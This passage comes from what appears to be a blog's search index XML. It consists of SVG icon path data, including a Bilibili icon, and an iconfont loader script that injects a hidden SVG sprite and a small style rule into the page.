322.50699546-447.44996375C995.31636231 262.8401375 783.69369203 52 523.6581816 52z" fill="#663399" ></path><path d="M230.82365863 729.03136735c-0.7807359 2.34310703-4.68531653 3.12384382-7.80916035 1.56237113s-5.46605242-4.68531653-3.90368129-7.02842356c0.7807359-2.34220859 4.68531653-3.12384382 7.80826192-1.56147269s4.68531653 4.68531653 3.90457972 7.02752512z m18.7412661 21.08437312c-2.34220859 2.34220859-7.02752512 0.78163433-9.37063305-2.34310703-3.12294539-3.12294539-3.90457972-7.80826192-1.5614727-10.15136894 2.34220859-2.34220859 6.24678922-0.7807359 9.37063305 2.34310702 3.12384382 3.90457972 3.90457972 8.58899782 1.5614727 10.15136895zM268.30618992 777.44690281c-3.12294539 2.34220859-7.80826192 0-10.15136895-3.90457972-3.12384382-3.90457972-3.12384382-9.37063305 0-10.93210574 3.12384382-2.34310703 7.80916035 0 10.15226739 3.90457972 3.12294539 3.90368129 3.12294539 8.58899782 0 10.93210574z m25.76968965 26.55042555c-2.34220859 3.12294539-7.80916035 2.34220859-12.49447688-1.56237113-3.90457972-3.90368129-5.46605242-9.37063305-2.34220859-11.71284164 2.34220859-3.12384382 7.80826192-2.34310703 12.49447687 1.56147269 3.90368129 3.12384382 4.68531653 8.58989625 2.3422086 11.71374008z m35.1403227 14.83668637c-0.78163433 3.90457972-6.24768766 5.46605242-11.71374008 3.90457972-5.46605242-1.5614727-8.58899782-6.24768766-7.80916036-9.37063305 0.78163433-3.90457972 6.24768766-5.46605242 11.71374009-3.90457972 5.46605242 1.5614727 8.58899782 5.46605242 7.80916035 9.37063305z m38.26416562 3.12384382c0 3.90457972-4.68621496 7.02752512-10.15226738 7.02752512-5.46605242 0-10.15226738-3.12294539-10.15226739-7.02752512s4.68621496-7.02842356 10.15226739-7.02842445c5.46605242 0 10.15226738 3.12384382 10.15226738 7.02842445z m35.92016106-6.24768766c0.78163433 3.90457972-3.12384382 7.80916035-8.58899872 8.58989625-5.46695086 0.78163433-10.15226738-1.5614727-10.93390172-5.46605241-0.77983747-3.90457972 3.12384382-7.80916035 8.5907947-8.58899872 5.46605242-0.78163433 10.15136894 1.56057426 10.93210574 5.46515488z m0 0" fill="#663399" ></path></symbol><symbol id="icon-bilibili" viewBox="0 0 1024 1024"><path d="M832.61667555 181.33447111h-164.32545185l74.45617778-74.45617778c12.84020148-12.84020148 12.84020148-30.8140563 0-43.65425778-12.84020148-12.84020148-30.8140563-12.84020148-43.65425778 0L573.2882963 189.04101925H450.04420741L324.2272237 63.23617185c-10.26730667-12.84020148-25.68040297-15.40096-41.08136295-7.70654815-2.57289482 0-2.57289482 2.57289482-5.13365334 5.13365333-12.84020148 12.84020148-12.84020148 30.8140563 0 43.65425779l77.02907259 77.02907259h-164.32545185c-89.86927408 0-164.32545185 74.45617778-164.32545185 164.32545184v408.24073483c0 87.29637925 74.45617778 161.75255703 164.32545185 161.75255703h25.68040296c0 30.8140563 25.68040297 53.92156445 53.92156444 53.92156444s53.92156445-25.68040297 53.92156445-53.92156444H704.23893333c2.57289482 30.8140563 28.24116148 53.92156445 59.05521778 51.34866964 28.24116148-2.57289482 48.78791111-23.10750815 51.34866964-51.34866964h20.53461333c89.86927408 0 164.32545185-74.45617778 164.32545184-164.32545186V343.09916445c-2.56075852-89.86927408-77.02907259-161.76469333-166.88621037-161.76469334z m-5.13365333 634.19429926H200.99527111c-33.37481482 0-59.05521778-28.24116148-61.61597629-61.61597629l-2.57289482-415.94728297c0-33.37481482 28.24116148-61.6159763 61.6159763-61.61597629h626.48775111c33.37481482 0 59.05521778 28.24116148 61.61597629 61.61597629l2.57289482 415.94728297c-2.57289482 35.93557333-28.24116148 61.6159763-61.6159763 61.61597629z" fill="#ff7299" ></path><path d="M403.82919111 417.55534222l15.40096 77.0290726-205.40681481 38.50846815-15.40096-77.0290726 205.40681481-38.50846815z m197.70026667 77.0290726l15.40096-77.0290726 205.40681481 38.50846815-15.40096 77.0290726-205.40681481-38.50846815z m41.08136297 161.75255703c0 2.57289482 0 7.70654815-2.57289483 10.26730667-12.84020148 28.24116148-41.08136297 46.2150163-74.45617777 48.78791111-20.53461333 0-41.08136297-10.26730667-53.92156445-25.68040296-15.40096 15.40096-33.37481482 25.68040297-53.92156445 25.68040296-30.8140563-2.57289482-59.05521778-20.53461333-74.45617777-48.78791111 0-2.57289482-2.57289482-5.13365333-2.57289481-10.26730667 0-10.26730667 7.70654815-17.97385482 17.97385481-20.53461333h2.57289482c7.70654815 0 12.84020148 2.57289482 15.40096 10.26730666 0 0 20.53461333 28.24116148 38.50846815 28.24116149 35.94770963 0 35.94770963-30.8140563 56.48232296-53.92156445 23.10750815 25.68040297 23.10750815 53.92156445 56.48232296 53.92156445 23.10750815 0 38.50846815-28.24116148 38.50846815-28.24116149 2.57289482-5.13365333 10.26730667-10.26730667 15.40096-10.26730666 10.26730667-2.57289482 17.97385482 5.13365333 20.53461333 15.40096v5.13365333h0.0364089z" fill="#ff7299" ></path></symbol></svg>',    o = (o = document.getElementsByTagName("script"))[o.length - 1].getAttribute("data-injectcss"),    p = function (c, l) {      l.parentNode.insertBefore(c, l);    };  if (o && !c.__iconfont__svg__cssinject__) {    c.__iconfont__svg__cssinject__ = !0;    try {      document.write(        "<style>.svgfont {display: inline-block;width: 1em;height: 1em;fill: currentColor;vertical-align: -0.1em;font-size:16px;}</style>"      );    } catch (c) {      console && console.log(c);    }  }  function d() {    i || ((i = !0), a());  }  function m() {    try {      t.documentElement.doScroll("left");    } catch (c) {      return void setTimeout(m, 50);    }    d();  }  (l = function () {    var c,      l = document.createElement("div");    (l.innerHTML = v),      (v = null),      (l = l.getElementsByTagName("svg")[0]) &&        (l.setAttribute("aria-hidden", "true"),        (l.style.position = "absolute"),        (l.style.width = 0),        (l.style.height = 0),        (l.style.overflow = "hidden"),        (l = l),        (c = document.body).firstChild ? p(l, c.firstChild) : c.appendChild(l));  }),    document.addEventListener      ? ~["complete", "loaded", "interactive"].indexOf(document.readyState)        ? setTimeout(l, 0)        : ((h = function () {            document.removeEventListener("DOMContentLoaded", h, !1), l();          }),          document.addEventListener("DOMContentLoaded", h, !1))      : document.attachEvent &&        ((a = l),        (t = c.document),        (i = !1),        m(),        (t.onreadystatechange = function () {          "complete" == t.readyState && ((t.onreadystatechange = null), d());        }));})(window);]]></content>
      
    </entry>
    
    
  
</search>
